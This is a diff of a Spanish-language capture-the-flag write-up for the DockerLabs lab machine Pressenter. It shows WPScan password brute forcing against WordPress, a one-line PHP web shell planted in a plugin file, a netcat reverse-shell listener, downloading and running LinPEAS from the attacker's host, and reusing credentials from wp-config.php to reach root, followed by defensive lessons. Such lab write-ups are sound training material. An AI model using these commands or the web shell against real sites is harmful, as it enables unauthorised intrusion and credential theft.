@@ -1,84 +1,285 @@
-# PRESSENTER — DockerLabs
+# Pressenter — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** d1se0  
+**Fecha de creación:** 29/08/2024  
+**Técnicas:** WordPress · WPScan · Reverse Shell · File Manager Plugin · LinPEAS · MySQL Enumeration · Credential Reuse
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **PRESSENTER** de DockerLabs.
-
----
-
-## 1. Reconocimiento
-
-Vamos a desplegar la maquina vulnerable
-
-Hacemos un escaneo de los puertos que tiene abierto la maquina
-
-Vemos que tiene un servidor http, así que miraremos la pagina a ver que nos
-encontramos
-
-Mirando el código vemos que apunta hacia un servidor, así que lo editaremos en
-/etc/hosts para poder explorar.
-
-## 2. Enumeración
-
-Ahora podemos hacer un escaneo y vemos que cuenta con wordpress.
-
-Haremos un escaneo primero para probar en encontrar usuarios dentro.
-
-Una vez sepamos los usuarios, haremos un ataque de fuerza bruta para ver si nos
-encontramos algo.
-
-Nos encontramos con la contraseña de pressi, así que ingresaremos y veremos
-que somos el administrador, así que podemos hacer lo que queramos dentro de
-wordpress.
-
-## 3. Explotación
-
-Añadiremos un plugin que nos ayudara a manejar los ficheros de este servidor.
-
-Vemos que tenemos ficheros de lectura y escritura, así que a cualquier php que
-cuente con estos permisos lo editaremos para luego poder hacer una reverse
-Shell.
-
-Añadimos el siguiente código para poder ejecutar comandos de cmd.
-
-Ahora lo guardamos y podemos ver la información donde esta este documento
-ubicado.
-
-## 4. Post-explotación
-
-Hacemos una prueba para ver que si ejecuta comandos de cmd.
-
-Ahora haremos una reverse Shell.
-
-Vemos que estamos dentro del servidor.
-
-Como no encontré nada que pueda comprometer, he utilizado linpeas para
-encontrar alguna vulnerabilidad.
-
-## 5. Escalada de privilegios
-
-Lo compartiremos desde nuestro host a la maquina victima y lo ejecutamos.
-
-Vemos que encontró una base de datos con la contraseña del administrador.
-
-Vemos que entramos sin ningún problema, así que exploraremos a ver que nos
-encontramos
-
-Explorando encontramos la base de datos, tablas y un usuario y contraseña.
-
-## 6. Lección aprendida
-
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
-
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración WordPress](#2-enumeración-wordpress)
+3. [Fuerza bruta WordPress — WPScan](#3-fuerza-bruta-wordpress--wpscan)
+4. [File Upload y Reverse Shell](#4-file-upload-y-reverse-shell)
+5. [Enumeración interna — LinPEAS](#5-enumeración-interna--linpeas)
+6. [Acceso a MySQL y reutilización de credenciales](#6-acceso-a-mysql-y-reutilización-de-credenciales)
+7. [Lección aprendida](#7-lección-aprendida)
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 1. Despliegue y reconocimiento
+
+Desplegamos la máquina vulnerable:
+
+```bash
+sudo bash auto_deploy.sh pressenter.tar
+```
+
+> IP asignada: `172.17.0.2`
+
+Realizamos un escaneo completo:
+
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
+
+Resultado:
+
+```text
+80/tcp open http
+```
+
+Accedemos al servidor web y observamos la página principal de Pressenter CTF.
+
+Inspeccionando el código fuente encontramos el dominio:
+
+```text
+pressenter.hl
+```
+
+Lo añadimos a `/etc/hosts`:
+
+```bash
+sudo nano /etc/hosts
+```
+
+```text
+172.17.0.2 pressenter.hl
+```
+
+---
+
+## 2. Enumeración WordPress
+
+Enumeramos directorios:
+
+```bash
+dirb http://pressenter.hl/
+```
+
+Resultado:
+
+```text
+/wp-admin
+/wp-content
+/wp-includes
+/xmlrpc.php
+```
+
+La aplicación utiliza WordPress.
+
+---
+
+## 3. Fuerza bruta WordPress — WPScan
+
+Enumeramos usuarios:
+
+```bash
+wpscan --url http://pressenter.hl \
+--enumerate u
+```
+
+Usuarios encontrados:
+
+```text
+pressi
+hacker
+```
+
+Realizamos fuerza bruta contra el usuario `pressi`:
+
+```bash
+wpscan --url http://pressenter.hl \
+--enumerate u \
+-U pressi \
+-P /usr/share/wordlists/rockyou.txt
+```
+
+Resultado:
+
+```text
+Username: pressi
+Password: dumbass
+```
+
+Accedemos al panel de administración de WordPress.
+
+---
+
+## 4. File Upload y Reverse Shell
+
+Instalamos el plugin:
+
+```text
+File Manager
+```
+
+Explorando los directorios observamos que varios ficheros PHP tienen permisos de lectura y escritura.
+
+Editamos:
+
+```text
+hello.php
+```
+
+Añadimos:
+
+```php
+<?php
+system($_GET["cmd"]);
+?>
+```
+
+La ruta final es:
+
+```text
+pressenter/wp-content/plugins/hello.php
+```
+
+Comprobamos ejecución de comandos:
+
+```text
+http://pressenter.hl/wp-content/plugins/hello.php?cmd=id
+```
+
+Resultado:
+
+```text
+uid=33(www-data)
+```
+
+Nos ponemos en escucha:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Generamos una reverse shell Bash y obtenemos acceso:
+
+```bash
+whoami
+www-data
+```
+
+---
+
+## 5. Enumeración interna — LinPEAS
+
+Transferimos LinPEAS desde nuestro host:
+
+```bash
+python3 -m http.server 8000
+```
+
+En la máquina víctima:
+
+```bash
+wget http://192.168.1.26:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+LinPEAS encuentra credenciales dentro de:
+
+```text
+/var/www/pressenter/wp-config.php
+```
+
+Resultado:
+
+```php
+define('DB_USER', 'admin');
+define('DB_PASSWORD', 'rootbeable');
+```
+
+---
+
+## 6. Acceso a MySQL y reutilización de credenciales
+
+Accedemos a MySQL:
+
+```bash
+mysql -u admin -p -h localhost
+```
+
+Contraseña:
+
+```text
+rootbeable
+```
+
+Enumeramos bases de datos:
+
+```sql
+SHOW DATABASES;
+```
+
+Exploramos tablas y usuarios.
+
+Encontramos credenciales:
+
+```text
+enter : rootbeable
+```
+
+Cambiamos al usuario:
+
+```bash
+su enter
+```
+
+Probamos reutilización de contraseña con root:
+
+```bash
+su root
+```
+
+Acceso correcto.
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
+
+---
+
+## 7. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| WordPress vulnerable a fuerza bruta | Acceso administrador |
+| Plugin File Manager inseguro | Ejecución remota de comandos |
+| Reverse Shell PHP | Acceso inicial |
+| Credenciales en wp-config.php | Acceso a MySQL |
+| Reutilización de contraseñas | Escalada a root |
+
+**Para defenderse:**
+
+- Restringir fuerza bruta en WordPress.
+- Evitar plugins innecesarios o inseguros.
+- No reutilizar contraseñas entre servicios.
+- Proteger credenciales sensibles en archivos de configuración.
+- Aplicar segmentación de privilegios.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
